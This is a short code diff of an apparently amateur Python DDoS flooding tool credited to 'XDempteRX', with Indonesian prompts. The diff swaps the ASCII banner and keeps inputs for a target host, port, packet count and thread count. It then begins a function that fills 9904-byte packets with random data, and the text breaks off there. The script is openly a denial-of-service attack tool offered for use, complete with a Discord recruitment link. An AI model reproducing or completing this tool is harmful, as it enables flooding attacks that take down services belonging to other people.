@@ -4,16 +4,20 @@ import random
 import socket
 import threading
 
-print("===> C0de By XDempteRX <===")
-print("===> Tools XDempteRX V1 <===")
-print("===> KUY JOIN: https://discord.gg/FUgcMMF8eR <===")
-print("===> TOOLS INI DILARANG SEMBARANG PAKE <===")
-print("===> PENGEN RENAME, REMAKE, PM ME DI LINK DC ATAS <===")
-ip = str(input(" HOST/IP TARGET:"))
-port = int(input(" PORT TARGET:"))
-choice = str(input(" GASS DI SERANG?(y/n):"))
-times = int(input(" PACKETS DDOS:"))
-threads = int(input(" THREADS DDOS:"))
+os.system("clear")
+print("══》 Tools V4 By : XDempteRX 《══")
+print("██╗░░██╗###############██")
+print("╚██╗██╔╝|Autor : XDempteRX   |")
+print("░╚███╔╝░|Yang Mau Rename|")
+print("░██╔██╗░|Pm me !!!!     |")
+print("██╔╝╚██╗|Xstyleboy Team |")
+print("╚═╝░░╚═╝###############██")
+
+ip = str(input("══》HOST/IP TARGET:"))
+port = int(input("══》PORT TARGET:"))
+choice = str(input("══》GASS BRO SERANG?(y/n):"))
+times = int(input("══》PACKETS DDOS:"))
+threads = int(input("══》THREADS DDOS:"))
 def run():
 	data = random._urandom(9904)
 	i = random.choice(("[&]","[!]","[#]"))
